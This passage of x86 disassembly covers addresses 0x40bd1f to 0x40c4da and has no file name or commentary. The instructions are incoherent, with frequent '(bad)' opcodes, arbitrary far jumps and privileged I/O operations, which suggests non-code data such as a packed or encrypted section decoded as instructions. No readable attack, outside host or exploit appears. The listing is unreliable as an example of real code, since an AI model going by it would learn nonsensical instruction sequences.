  40bd1f:	out    dx,al
  40bd20:	pop    edx
  40bd21:	(bad)  
  40bd22:	mov    eax,ds:0x38b0ad23
  40bd27:	test   al,0x60
  40bd29:	cld    
  40bd2a:	popf   
  40bd2b:	and    ebp,esp
  40bd2d:	fwait
  40bd2e:	sub    al,0x8f
  40bd30:	mov    edx,0xce4526c3
  40bd35:	test   edx,edx
  40bd37:	mov    cl,0xe4
  40bd39:	jno    0x40bd1d
  40bd3b:	mov    WORD PTR [esp+esi*1-0x31],?
  40bd3f:	cmp    eax,0x2ee5fc94
  40bd44:	lock inc ecx
  40bd46:	dec    esp
  40bd47:	jge    0x40bd9f
  40bd49:	aas    
  40bd4a:	popf   
  40bd4b:	mov    BYTE PTR [esi-0x27b988d1],ch
  40bd51:	jnp    0x40bcf0
  40bd53:	test   eax,0xd351bb01
  40bd58:	gs inc edx
  40bd5a:	mov    edi,0xd88be8d9
  40bd5f:	stos   BYTE PTR es:[edi],al
  40bd60:	cmp    DWORD PTR [esi+0x62],edi
  40bd63:	repz mov eax,ds:0x8db77a5f
  40bd69:	mov    edi,0xd1289c40
  40bd6e:	mov    dl,0xae
  40bd70:	(bad)  
  40bd71:	push   esp
  40bd72:	mov    WORD PTR [edx+0x7e5d501c],ss
  40bd78:	mov    ebp,0x5034f4ff
  40bd7d:	dec    eax
  40bd7e:	pop    es
  40bd7f:	pop    ds
  40bd80:	push   esi
  40bd81:	pop    edi
  40bd82:	jl     0x40bd09
  40bd84:	adc    al,BYTE PTR [edx-0xa]
  40bd87:	jmp    0x131:0xe117f82b
  40bd8e:	push   edx
  40bd8f:	pop    ss
  40bd90:	and    DWORD PTR [ecx+0x3d],edi
  40bd93:	inc    ecx
  40bd94:	outs   dx,DWORD PTR ds:[esi]
  40bd95:	jnp    0x40bdc6
  40bd97:	or     al,BYTE PTR [ebx]
  40bd99:	dec    edi
  40bd9a:	dec    eax
  40bd9b:	mov    ebp,DWORD PTR [esi+0x59]
  40bd9e:	arpl   WORD PTR [eax],bx
  40bda0:	mov    bl,dl
  40bda2:	sbb    eax,0x26e70329
  40bda7:	and    al,0x34
  40bda9:	pop    eax
  40bdaa:	jmp    0x91596893
  40bdaf:	dec    eax
  40bdb0:	mov    WORD PTR [edi+eiz*8+0x3f07b1bc],fs
  40bdb7:	jl     0x40bdd8
  40bdb9:	jnp    0x40be03
  40bdbb:	xor    eax,0x56a08c45
  40bdc0:	jl     0x40be09
  40bdc2:	mov    al,ds:0x92cff7d7
  40bdc7:	xor    DWORD PTR [edx-0x8],0xffffffbf
  40bdcb:	and    eax,DWORD PTR [esi-0x26c99aed]
  40bdd1:	fsave  [edi+ecx*1]
  40bdd5:	xor    ch,BYTE PTR [eax-0x59e47b98]
  40bddb:	int    0x40
  40bddd:	scas   al,BYTE PTR es:[edi]
  40bdde:	rol    ch,cl
  40bde0:	mov    eax,ds:0x176c467
  40bde5:	push   0x45
  40bde7:	push   edx
  40bde8:	mov    DWORD PTR [eax-0x1],eax
  40bdeb:	pop    ss
  40bdec:	xchg   edi,eax
  40bded:	xchg   edx,edx
  40bdef:	imul   ecx,DWORD PTR [ebx],0xffffff9c
  40bdf2:	mov    ecx,0x6d0efef5
  40bdf7:	cmp    DWORD PTR [edi],ecx
  40bdf9:	aas    
  40bdfa:	scas   eax,DWORD PTR es:[edi]
  40bdfb:	jg     0x40be16
  40bdfd:	leave  
  40bdfe:	shl    BYTE PTR fs:[eax],0x9f
  40be02:	xchg   ecx,eax
  40be03:	call   0x5f3d:0x2e60ebb1
  40be0a:	jl     0x40be43
  40be0c:	xchg   ebx,eax
  40be0d:	int3   
  40be0e:	int3   
  40be0f:	xor    ebp,DWORD PTR [ebp+0x42443dda]
  40be15:	outs   dx,BYTE PTR ds:[esi]
  40be16:	cmp    al,0x83
  40be18:	mov    bh,0xf8
  40be1a:	and    al,0x3
  40be1c:	inc    esp
  40be1d:	scas   eax,DWORD PTR es:[edi]
  40be1e:	dec    esp
  40be1f:	push   edi
  40be20:	cmp    eax,0xff215476
  40be25:	es or  al,0xe
  40be28:	jge    0x40bded
  40be2a:	pushf  
  40be2b:	leave  
  40be2c:	les    esp,FWORD PTR [ebp+0x66]
  40be2f:	cvtpi2ps xmm3,mm3
  40be32:	add    BYTE PTR [edx],ah
  40be34:	and    BYTE PTR [ebp-0x4c8fd7af],ah
  40be3a:	pop    ecx
  40be3b:	adc    eax,DWORD PTR [edi]
  40be3d:	lods   al,BYTE PTR ds:[esi]
  40be3e:	leave  
  40be3f:	add    BYTE PTR gs:[ebx-0x47],ch
  40be43:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40be45:	or     DWORD PTR [edx-0x204103e0],edi
  40be4b:	add    BYTE PTR [ecx-0x1fef6425],0x1d
  40be52:	mov    fs,WORD PTR [ecx]
  40be54:	daa    
  40be55:	pop    ds
  40be56:	xchg   esp,eax
  40be57:	daa    
  40be58:	or     ebx,esp
  40be5a:	inc    ecx
  40be5b:	adc    eax,0x27366360
  40be60:	add    DWORD PTR cs:[ebx],0xffffffaf
  40be64:	fisub  DWORD PTR [edx+0x1f1f485b]
  40be6a:	push   es
  40be6b:	mov    eax,ds:0x9ce47670
  40be70:	call   esp
  40be72:	test   eax,0x93f20b2a
  40be77:	jp     0x40be91
  40be79:	loopne 0x40be36
  40be7b:	aas    
  40be7c:	hlt    
  40be7d:	inc    ecx
  40be7e:	sti    
  40be7f:	jmp    0x40be85
  40be81:	jge    0x40be31
  40be83:	xor    eax,0xbc213b6d
  40be88:	mov    al,ds:0xf9460530
  40be8d:	jg     0x40beb3
  40be8f:	adc    DWORD PTR [ebp-0x1c148caa],ecx
  40be95:	cli    
  40be96:	dec    edx
  40be97:	ss repnz and eax,0x66ad4b52
  40be9e:	push   0xffffff89
  40bea0:	add    DWORD PTR [edx+0x403a672d],ebp
  40bea6:	bound  ebp,QWORD PTR [edi+edi*2+0x322d5cfc]
  40bead:	pop    eax
  40beae:	and    DWORD PTR [edi+0x78ad6262],ebp
  40beb4:	(bad)  
  40beb5:	retf   0x342c
  40beb8:	int    0x7f
  40beba:	aad    0x76
  40bebc:	lea    edx,[ebp-0x7eb962d4]
  40bec2:	mov    ebx,0x1ab44403
  40bec7:	in     eax,dx
  40bec8:	sar    cl,1
  40beca:	or     DWORD PTR gs:[edi],edi
  40becd:	push   ebx
  40bece:	adc    ebp,DWORD PTR [ebx]
  40bed0:	cdq    
  40bed1:	mov    eax,0x505a8871
  40bed6:	push   cs
  40bed7:	sbb    eax,0xc6abcc61
  40bedc:	repnz cmp eax,0xde705ee3
  40bee2:	jecxz  0x40bf55
  40bee4:	xor    eax,0xbf10007c
  40bee9:	push   esi
  40beea:	jge    0x40bf10
  40beec:	jae    0x40bec5
  40beee:	jb     0x40bef5
  40bef0:	jecxz  0x40beae
  40bef2:	sbb    ebp,DWORD PTR [ebx-0x6d10d509]
  40bef8:	mov    DWORD PTR [edi+0x74abbd51],esi
  40befe:	ins    BYTE PTR es:[edi],dx
  40beff:	jae    0x40bf73
  40bf01:	pop    ds
  40bf02:	dec    edi
  40bf03:	je     0x40bea2
  40bf05:	jecxz  0x40bea5
  40bf07:	outs   dx,DWORD PTR es:[esi]
  40bf09:	xchg   ecx,eax
  40bf0a:	rcl    DWORD PTR [esi+0x7a],cl
  40bf0d:	cmc    
  40bf0e:	pop    esp
  40bf0f:	les    edi,FWORD PTR [ebp+ecx*4+0x1c9347dd]
  40bf16:	test   DWORD PTR [ebx],esi
  40bf18:	test   BYTE PTR [edx],dh
  40bf1a:	jl     0x40bea4
  40bf1c:	in     al,0x26
  40bf1e:	(bad)  
  40bf1f:	mov    bh,0xa2
  40bf21:	lods   al,BYTE PTR ds:[esi]
  40bf22:	dec    eax
  40bf23:	or     BYTE PTR [edi-0x74e95811],ah
  40bf29:	mov    ah,0xc6
  40bf2b:	push   edx
  40bf2c:	mov    eax,ds:0x8b56b3cf
  40bf31:	add    bh,0xf
  40bf34:	imul   esi,DWORD PTR [eax-0x2d],0x1481bd08
  40bf3b:	fnstcw WORD PTR [edx]
  40bf3d:	dec    ebp
  40bf3e:	jns    0x40bf3b
  40bf40:	jle    0x40bf4e
  40bf42:	call   0x31b7:0x95aaf936
  40bf49:	mov    esi,0xc4adb991
  40bf4e:	sbb    BYTE PTR [ebp-0x6c],cl
  40bf51:	sbb    BYTE PTR [eax-0x1f157739],bh
  40bf57:	mov    ch,0x6e
  40bf59:	jecxz  0x40bf54
  40bf5b:	dec    esi
  40bf5c:	and    DWORD PTR [esi],ebx
  40bf5e:	jecxz  0x40bfdd
  40bf60:	dec    ebx
  40bf61:	lock pop ds
  40bf63:	pop    ds
  40bf64:	mov    al,ds:0xff697cc3
  40bf69:	mov    ah,0x2b
  40bf6b:	test   DWORD PTR [ebp+0x4c],eax
  40bf6e:	stos   BYTE PTR es:[edi],al
  40bf6f:	fsubp  st(0),st
  40bf71:	inc    esp
  40bf72:	cmp    bl,BYTE PTR [ebp-0x359d2da5]
  40bf78:	jmp    0x40bf80
  40bf7a:	push   ss
  40bf7b:	gs retf 0x30b2
  40bf7f:	stos   BYTE PTR es:[edi],al
  40bf80:	sahf   
  40bf81:	aam    0xeb
  40bf83:	dec    esp
  40bf84:	jmp    0x7df3b83
  40bf89:	js     0x40bfd6
  40bf8b:	xchg   ecx,eax
  40bf8c:	sub    BYTE PTR [edi+0x43062aea],bl
  40bf92:	in     eax,0xe3
  40bf94:	sahf   
  40bf95:	mov    esi,0x63c8784b
  40bf9a:	or     DWORD PTR [edi],0x7
  40bf9d:	xchg   BYTE PTR [edx+ebp*2-0x24475a29],bl
  40bfa4:	adc    BYTE PTR [eax+ebp*4],0xc1
  40bfa8:	jnp    0x40bfdb
  40bfaa:	or     eax,0x17b18518
  40bfaf:	lea    ecx,[ebx-0x32]
  40bfb2:	test   eax,0xd3aa0f55
  40bfb7:	daa    
  40bfb8:	test   ah,cl
  40bfba:	loope  0x40bf4c
  40bfbc:	pop    edx
  40bfbd:	push   0x4d
  40bfbf:	xor    al,0x1f
  40bfc1:	push   ebx
  40bfc2:	and    esp,DWORD PTR [esi]
  40bfc4:	cmc    
  40bfc5:	cmp    edx,esp
  40bfc7:	sbb    edx,edi
  40bfc9:	(bad)  
  40bfca:	sbb    edx,DWORD PTR [ebx]
  40bfcc:	les    edi,FWORD PTR [edx+0x19db52f0]
  40bfd2:	bound  edi,QWORD PTR [esi-0x69]
  40bfd5:	imul   BYTE PTR ds:0x49c302c1
  40bfdb:	cmp    al,0x6b
  40bfdd:	and    ecx,edi
  40bfdf:	jg     0x40bf7b
  40bfe1:	lock retf 
  40bfe3:	or     ebx,DWORD PTR [edi]
  40bfe5:	int    0x41
  40bfe7:	push   eax
  40bfe8:	jmp    0x40bfb8
  40bfea:	dec    esi
  40bfeb:	dec    edi
  40bfec:	rcl    ebx,0x8c
  40bfef:	pop    edi
  40bff0:	cld    
  40bff1:	repnz mov WORD PTR [esi],es
  40bff4:	jo     0x40c036
  40bff6:	aas    
  40bff7:	jmp    0x40c059
  40bff9:	mov    bh,0xe
  40bffb:	mov    ds,ebx
  40bffd:	sub    eax,0xdec369eb
  40c002:	jg     0x40bfcb
  40c004:	pop    ss
  40c005:	mov    esi,DWORD PTR [edx-0x71dd3259]
  40c00b:	cwde   
  40c00c:	mov    al,0x5b
  40c00e:	cmp    al,0x44
  40c010:	push   0x25da352a
  40c015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c016:	call   0xfd543f2e
  40c01b:	test   esi,ecx
  40c01d:	enter  0xed95,0x10
  40c021:	fbstp  TBYTE PTR [eax+0x6ffe7386]
  40c027:	push   0xffffffe7
  40c029:	mov    bl,0xee
  40c02b:	sbb    ebx,DWORD PTR [esi-0x5b]
  40c02e:	(bad)  
  40c030:	sub    edi,DWORD PTR [ebx-0x5a208cc5]
  40c036:	enter  0xbfc2,0x82
  40c03a:	mov    eax,ds:0xac6991a
  40c03f:	data16 int 0xb1
  40c042:	jo     0x40c096
  40c044:	(bad)  
  40c045:	mov    ebp,0x4aa90a8c
  40c04a:	push   esi
  40c04b:	ret    0xeeca
  40c04e:	xchg   ebp,eax
  40c04f:	call   0x4404:0xd1867464
  40c056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c057:	test   BYTE PTR [ecx+eiz*1-0x64],dh
  40c05b:	ret    
  40c05c:	jns    0x40c065
  40c05e:	push   0x3e6b1f12
  40c063:	sub    bl,BYTE PTR [edx-0xbc3eed6]
  40c069:	lahf   
  40c06a:	or     BYTE PTR [edi+ebx*8],0x3b
  40c06e:	jmp    0x40c004
  40c070:	loop   0x40c070
  40c072:	add    ebp,DWORD PTR [edx-0x3f]
  40c075:	fldl2e 
  40c077:	adc    eax,0xd03068fe
  40c07c:	mov    ch,0xda
  40c07e:	sbb    bl,al
  40c080:	mov    WORD PTR [ecx-0x25],fs
  40c083:	mov    cl,0xc8
  40c085:	xchg   ebx,eax
  40c086:	imul   ebp,edx,0xc28e8552
  40c08c:	cmc    
  40c08d:	lea    esi,[esi-0x3984a9ea]
  40c093:	dec    esi
  40c094:	fucomi st,st(6)
  40c096:	xor    bl,BYTE PTR [ebx-0x75]
  40c099:	xor    BYTE PTR [esp+ebp*2],ch
  40c09c:	mov    ds:0xa9dd46a1,eax
  40c0a1:	xor    ebx,DWORD PTR [ebp-0x20c94a28]
  40c0a7:	and    al,dh
  40c0a9:	aas    
  40c0aa:	jge    0x40c0a5
  40c0ac:	loopne 0x40c096
  40c0ae:	mov    al,ds:0xba9d3c2f
  40c0b3:	lock sbb cl,BYTE PTR [edi]
  40c0b6:	retf   0xeea3
  40c0b9:	push   esi
  40c0ba:	add    BYTE PTR ds:0xadf3ff99,bl
  40c0c0:	push   es
  40c0c1:	add    BYTE PTR ds:0x91f38cee,bh
  40c0c7:	out    0x4b,eax
  40c0c9:	fs lock mov esi,0xf2524bd0
  40c0d0:	fwait
  40c0d1:	push   eax
  40c0d2:	in     eax,dx
  40c0d3:	jecxz  0x40c093
  40c0d5:	dec    edx
  40c0d6:	iret   
  40c0d7:	jnp    0x40c05b
  40c0d9:	ret    
  40c0da:	and    eax,0x9a6717f3
  40c0df:	or     al,BYTE PTR [esi]
  40c0e1:	fcom   st(6)
  40c0e3:	jae    0x40c06b
  40c0e5:	out    dx,al
  40c0e6:	jl     0x40c0d3
  40c0e8:	xchg   esi,eax
  40c0e9:	in     eax,dx
  40c0ea:	fld    QWORD PTR [edi+0x15]
  40c0ed:	arpl   WORD PTR [ecx],di
  40c0ef:	sbb    DWORD PTR [ecx-0x61],eax
  40c0f2:	into   
  40c0f3:	test   eax,0x3f1313d4
  40c0f8:	je     0x40c15c
  40c0fa:	ins    DWORD PTR es:[edi],dx
  40c0fb:	outs   dx,BYTE PTR ds:[esi]
  40c0fc:	push   ss
  40c0fd:	out    dx,eax
  40c0fe:	ret    
  40c0ff:	pop    esp
  40c100:	loope  0x40c176
  40c102:	out    dx,al
  40c103:	jb     0x40c159
  40c105:	mov    WORD PTR [edx-0x27],?
  40c108:	enterw 0x52b2,0x97
  40c10d:	lea    ebx,[ecx+eax*4]
  40c110:	(bad)  
  40c111:	mov    WORD PTR [ebx+0x5b5345c5],?
  40c117:	mov    ecx,0x5cc78a4
  40c11c:	ja     0x40c19b
  40c11e:	push   esi
  40c11f:	and    BYTE PTR [eax+eiz*8-0x48be9876],al
  40c126:	(bad)  
  40c128:	xlat   BYTE PTR ds:[ebx]
  40c129:	adc    bl,BYTE PTR ds:0x881378bc
  40c12f:	mov    fs,WORD PTR [eax]
  40c131:	ds cs push edi
  40c134:	lock fsub DWORD PTR [eiz*2-0x2cea5af0]
  40c13c:	xchg   BYTE PTR [edx-0xa],ch
  40c13f:	pop    ebp
  40c140:	(bad)  
  40c142:	cmc    
  40c143:	cli    
  40c144:	mov    ebp,0x98a9a554
  40c149:	inc    ecx
  40c14a:	out    0x60,al
  40c14c:	or     al,0x5b
  40c14e:	or     BYTE PTR [eax+0x50],0x74
  40c152:	in     al,dx
  40c153:	mov    dl,0xa2
  40c155:	mov    ecx,0xdf7a4947
  40c15a:	xchg   esi,eax
  40c15b:	not    edi
  40c15d:	sub    dh,BYTE PTR [eax-0x25c27196]
  40c163:	enter  0x168e,0x22
  40c167:	sbb    cl,cl
  40c169:	aaa    
  40c16a:	ret    0x7316
  40c16d:	in     eax,dx
  40c16e:	or     esi,edx
  40c170:	push   ds
  40c171:	ja     0x40c1ad
  40c173:	stc    
  40c174:	and    ecx,DWORD PTR [esi-0x6cd37042]
  40c17a:	mov    al,0x78
  40c17c:	mul    DWORD PTR [edx]
  40c17e:	add    cl,ah
  40c180:	xchg   ecx,eax
  40c181:	loope  0x40c194
  40c183:	pop    esi
  40c184:	sbb    eax,0x86e7347e
  40c189:	xor    BYTE PTR [esi-0x7ac27d40],bl
  40c18f:	jmp    0x4b6e:0xa1e2bfe0
  40c196:	test   al,0x82
  40c198:	mov    al,ds:0x623aa342
  40c19d:	sbb    esp,edi
  40c19f:	outs   dx,BYTE PTR ds:[esi]
  40c1a0:	add    DWORD PTR [edi+0x58341dda],eax
  40c1a6:	cmp    edi,DWORD PTR [esi-0x54]
  40c1a9:	cmp    al,0x47
  40c1ab:	mov    ds:0x16712a2e,al
  40c1b0:	imul   ebx,DWORD PTR [ecx],0x83c37bdb
  40c1b6:	aaa    
  40c1b7:	pusha  
  40c1b8:	in     al,0xf7
  40c1ba:	jb     0x40c17f
  40c1bc:	fs push ds
  40c1be:	xlat   BYTE PTR ds:[ebx]
  40c1bf:	mov    dl,0x41
  40c1c1:	adc    DWORD PTR [eax],ebp
  40c1c3:	sub    al,0xf3
  40c1c5:	(bad)  
  40c1c6:	push   ecx
  40c1c7:	std    
  40c1c8:	je     0x40c1af
  40c1ca:	xchg   edx,eax
  40c1cb:	push   edx
  40c1cc:	int3   
  40c1cd:	ror    DWORD PTR [eax-0x8],cl
  40c1d0:	repz clc 
  40c1d2:	adc    eax,0x748f5522
  40c1d7:	mov    bl,0x4
  40c1d9:	jo     0x40c1b7
  40c1db:	div    BYTE PTR [esi+0x2e]
  40c1de:	leave  
  40c1df:	lds    esp,FWORD PTR [eax+0x46f929dd]
  40c1e5:	adc    al,0x4d
  40c1e7:	jle    0x40c1e8
  40c1e9:	pop    ss
  40c1ea:	and    edi,ebx
  40c1ec:	sub    al,0xb1
  40c1ee:	mov    ds:0x8a49394c,eax
  40c1f3:	xchg   ebp,eax
  40c1f4:	imul   BYTE PTR [ecx]
  40c1f6:	jecxz  0x40c20d
  40c1f8:	ins    BYTE PTR es:[edi],dx
  40c1f9:	scas   eax,DWORD PTR es:[edi]
  40c1fa:	dec    esp
  40c1fb:	out    0xbe,eax
  40c1fd:	(bad)  
  40c201:	pop    ecx
  40c202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c203:	mov    es,esp
  40c205:	xchg   BYTE PTR [esi+0x86ab84f],dl
  40c20b:	mov    bl,0x30
  40c20d:	and    al,BYTE PTR [ecx-0x7d7d44ca]
  40c213:	in     eax,dx
  40c214:	vdivpd ymm6,ymm2,YMMWORD PTR [esi+0x260f0b98]
  40c21c:	call   0x88ed56d5
  40c221:	out    0xf7,eax
  40c223:	push   ds
  40c224:	push   ds
  40c225:	in     al,dx
  40c226:	loop   0x40c1c2
  40c228:	out    0xdc,al
  40c22a:	cmp    DWORD PTR [edx],0xeb7818ae
  40c230:	add    edi,esi
  40c232:	or     BYTE PTR [eax],cl
  40c234:	cmp    bl,BYTE PTR [esi+0x3b]
  40c237:	test   eax,0xbef8850
  40c23c:	das    
  40c23d:	and    al,0x9b
  40c23f:	and    edi,DWORD PTR [ecx]
  40c241:	lds    ecx,FWORD PTR [ebp+ebp*8-0x68]
  40c245:	or     dl,BYTE PTR [ebp-0x7f]
  40c248:	jecxz  0x40c212
  40c24a:	inc    esp
  40c24b:	cmp    eax,0xbf163331
  40c250:	call   0x2a91b030
  40c255:	jne    0x5d017f5e
  40c25b:	dec    ebp
  40c25c:	pop    es
  40c25d:	mov    WORD PTR [edi+0x10761b45],ss
  40c263:	in     al,0x10
  40c265:	pusha  
  40c266:	lods   al,BYTE PTR ds:[esi]
  40c267:	jmp    0x14e8:0x480736e1
  40c26e:	and    ah,BYTE PTR [ecx+0x13]
  40c271:	jno    0x40c219
  40c273:	lds    edx,FWORD PTR [ebx+0x2060d817]
  40c279:	leave  
  40c27a:	pop    edi
  40c27b:	and    dh,BYTE PTR [ebx-0x5962c853]
  40c281:	jbe    0x40c2aa
  40c283:	sbb    al,0x15
  40c285:	and    edx,DWORD PTR ds:0xdea4f16c
  40c28b:	test   esp,ebp
  40c28d:	lea    edx,[edi-0x10]
  40c290:	xchg   ecx,eax
  40c291:	jmp    0x242e:0x13d995f2
  40c298:	popa   
  40c299:	out    0xd6,eax
  40c29b:	scas   eax,DWORD PTR es:[edi]
  40c29c:	mov    eax,0x90676f6a
  40c2a1:	ins    DWORD PTR es:[edi],dx
  40c2a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2a3:	test   DWORD PTR [esi-0x6d],ebx
  40c2a6:	leave  
  40c2a7:	jg     0x40c2dc
  40c2a9:	mov    ?,WORD PTR [edi]
  40c2ab:	mov    bx,0x998d
  40c2af:	ror    BYTE PTR [eax-0x756f1b2],1
  40c2b5:	push   cs
  40c2b6:	pushf  
  40c2b7:	pop    ebp
  40c2b8:	in     eax,dx
  40c2b9:	je     0x40c26b
  40c2bb:	neg    DWORD PTR ds:0xc8606a23
  40c2c1:	sub    dh,BYTE PTR [ecx-0x671ea270]
  40c2c7:	and    bl,ch
  40c2c9:	imul   esp,DWORD PTR [edi+0x1230f708],0xeeacae0d
  40c2d3:	and    DWORD PTR [eax-0x62],esp
  40c2d6:	les    edi,FWORD PTR [esi-0x75]
  40c2d9:	sbb    DWORD PTR [ebx],ebp
  40c2db:	sbb    al,0x2
  40c2dd:	inc    ecx
  40c2de:	sub    eax,0xb300c726
  40c2e3:	xchg   ebx,eax
  40c2e4:	inc    esi
  40c2e5:	std    
  40c2e6:	or     al,0x9a
  40c2e8:	pop    ecx
  40c2e9:	jmp    0xf3b6c9e2
  40c2ee:	xor    al,0x86
  40c2f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2f1:	mov    ss,WORD PTR [ecx+ecx*4-0x58]
  40c2f5:	repnz sub bl,bl
  40c2f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2f9:	mov    al,0x9c
  40c2fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2fc:	mov    cs,WORD PTR [edx-0x79]
  40c2ff:	push   edi
  40c300:	jmp    0x79fb811a
  40c305:	push   edi
  40c306:	sub    DWORD PTR [edi+0x19],esi
  40c309:	mov    ds:0xd50a7c21,al
  40c30e:	jae    0x40c363
  40c310:	cmp    BYTE PTR [ebp+0x67],0xa8
  40c314:	in     eax,0x45
  40c316:	loopne 0x40c2ac
  40c318:	jnp    0x40c2f7
  40c31a:	xor    eax,0x839a7376
  40c31f:	out    0xc5,al
  40c321:	out    0x33,eax
  40c323:	pop    ss
  40c324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c325:	mov    DWORD PTR gs:[eax-0x73efe0e4],0xd58c0566
  40c330:	fcmovnu st,st(4)
  40c332:	mov    dh,0x88
  40c334:	mov    eax,ds:0x46c58fc8
  40c339:	mov    ds:0x4be8e74a,eax
  40c33e:	dec    eax
  40c33f:	adc    eax,0x1171a24f
  40c344:	call   0xa0110887
  40c349:	popf   
  40c34a:	mov    ds:0x487a2156,al
  40c34f:	(bad)  
  40c350:	test   DWORD PTR [ebx],0xb0da6ebf
  40c356:	in     al,0xf1
  40c358:	imul   esi,DWORD PTR [edi+ecx*8-0x4e],0x51
  40c35d:	adc    ebx,edx
  40c35f:	nop
  40c360:	add    cl,bh
  40c362:	sub    esi,DWORD PTR [ecx+ebp*1]
  40c365:	cs xor eax,0x16e27bc4
  40c36b:	xor    BYTE PTR [edx-0x66158e6a],cl
  40c371:	mov    ecx,0x79411f94
  40c376:	pusha  
  40c377:	cmc    
  40c378:	push   ebx
  40c379:	push   es
  40c37a:	out    0x71,al
  40c37c:	push   eax
  40c37d:	or     al,0x6
  40c37f:	xchg   ebx,eax
  40c380:	xor    BYTE PTR ds:0x79d274b9,al
  40c386:	mov    ebp,DWORD PTR [edx+0x4c]
  40c389:	inc    esp
  40c38a:	sub    ch,bh
  40c38c:	lock sbb eax,0xc87e5f40
  40c392:	cwde   
  40c393:	and    al,0x8a
  40c395:	mov    bh,bh
  40c397:	fisub  DWORD PTR [ecx+0x7a]
  40c39a:	dec    eax
  40c39b:	cmp    dh,BYTE PTR [ecx]
  40c39d:	sbb    edx,edx
  40c39f:	xor    DWORD PTR [eax+0x3],esp
  40c3a2:	mov    al,bl
  40c3a4:	stc    
  40c3a5:	jge    0x40c424
  40c3a7:	icebp  
  40c3a8:	mov    ah,0xa4
  40c3aa:	(bad)  
  40c3ab:	shr    ebx,1
  40c3ad:	push   0x40
  40c3af:	cmp    ebx,DWORD PTR [esi+0x3e]
  40c3b2:	aad    0x82
  40c3b4:	sub    BYTE PTR [ebx+0x11f3f79c],bl
  40c3ba:	ins    BYTE PTR es:[edi],dx
  40c3bb:	mov    WORD PTR [edx],ds
  40c3bd:	mov    bl,0x41
  40c3bf:	fadd   st,st(2)
  40c3c1:	cmp    DWORD PTR [ecx],0xc225a7b5
  40c3c7:	(bad)  
  40c3c9:	push   ecx
  40c3ca:	out    dx,eax
  40c3cb:	sub    eax,0x2a47427b
  40c3d0:	cmp    BYTE PTR [esi-0x33c66df2],dh
  40c3d6:	pop    ds
  40c3d7:	out    dx,eax
  40c3d8:	jns    0x40c444
  40c3da:	test   BYTE PTR [edx-0x402c5bd],0xb0
  40c3e1:	je     0x40c3c9
  40c3e3:	test   eax,0x153ee473
  40c3e8:	stos   DWORD PTR es:[edi],eax
  40c3e9:	inc    ecx
  40c3ea:	outs   dx,BYTE PTR ds:[esi]
  40c3eb:	push   edi
  40c3ec:	and    eax,0x16cc0add
  40c3f1:	rcr    DWORD PTR ds:0x7c6a3196,cl
  40c3f7:	cwde   
  40c3f8:	xchg   BYTE PTR [ecx+0x658eec77],al
  40c3fe:	push   ecx
  40c3ff:	push   eax
  40c400:	pop    ecx
  40c401:	std    
  40c402:	pop    ebp
  40c403:	cs or  al,0x57
  40c406:	or     ecx,DWORD PTR [edx+esi*4+0x38]
  40c40a:	inc    eax
  40c40b:	mov    dh,0xee
  40c40d:	sbb    eax,0x5866e455
  40c412:	dec    ebp
  40c413:	push   ebp
  40c414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c415:	jmp    0x40c3f3
  40c417:	je     0x40c404
  40c419:	neg    DWORD PTR [edx+0x65]
  40c41c:	xchg   esp,eax
  40c41d:	mov    ds,ecx
  40c41f:	jl     0x40c41d
  40c421:	xor    al,0xf1
  40c423:	inc    ebp
  40c424:	pop    ebx
  40c425:	inc    esi
  40c426:	sbb    eax,0xdb89f688
  40c42b:	rol    DWORD PTR [esi],0x9d
  40c42e:	sub    eax,0xf2c17be3
  40c433:	in     eax,dx
  40c434:	jo     0x40c4a6
  40c436:	cs je  0x40c48d
  40c439:	add    al,0xc6
  40c43b:	imul   ebx,DWORD PTR [esi+0x1d],0xccae980
  40c442:	or     ecx,DWORD PTR [ecx+0x3f]
  40c445:	shl    al,1
  40c447:	pusha  
  40c448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c449:	pusha  
  40c44a:	repz sbb eax,0xd63c17b2
  40c450:	add    bl,dh
  40c452:	sub    esi,DWORD PTR [esi]
  40c454:	pusha  
  40c455:	arpl   WORD PTR [esi-0x39b9e0ca],sp
  40c45b:	lahf   
  40c45c:	sub    ah,dl
  40c45e:	addr16 and eax,0xa72bcca
  40c464:	imul   edx,DWORD PTR [eax+0x78051ee1],0x5eb82f8e
  40c46e:	pop    edx
  40c46f:	push   ds
  40c470:	in     eax,0x82
  40c472:	test   eax,0x5426af72
  40c477:	mov    ch,0x3c
  40c479:	sbb    eax,ebx
  40c47b:	add    dl,al
  40c47d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c47f:	jg     0x40c48d
  40c481:	adc    ah,al
  40c483:	aad    0xba
  40c485:	aas    
  40c486:	fcomp  DWORD PTR [esi+ebp*4+0x56]
  40c48a:	hlt    
  40c48b:	ret    0x10d6
  40c48e:	dec    ebp
  40c48f:	mov    WORD PTR [edx],fs
  40c491:	or     DWORD PTR [ecx+0x6c01e44d],0xa
  40c498:	(bad)  
  40c499:	xor    al,0xb0
  40c49b:	or     BYTE PTR [ebp-0x724e56f7],ch
  40c4a1:	pushf  
  40c4a2:	inc    ecx
  40c4a3:	call   0x7e302096
  40c4a8:	mov    ds:0x14e5f5e2,al
  40c4ad:	jno    0x40c4c5
  40c4af:	ds sbb eax,0xc841c68e
  40c4b5:	adc    eax,0x1cdda5de
  40c4ba:	or     al,0xb
  40c4bc:	lea    edi,[ebx-0x12aad6a2]
  40c4c2:	cs jbe 0x40c539
  40c4c5:	les    edx,FWORD PTR [esi]
  40c4c7:	and    al,0x81
  40c4c9:	or     al,BYTE PTR [ecx-0x75]
  40c4cc:	sbb    ch,BYTE PTR [edx-0xf]
  40c4cf:	or     BYTE PTR [esi+edx*4-0x62],ah
  40c4d3:	sub    al,0x5e
  40c4d5:	daa    
  40c4d6:	cmp    DWORD PTR [edx],edx
  40c4d8:	pushf  
  40c4d9:	push   edi
  40c4da:	lods   al,BYTE PTR ds:[esi]
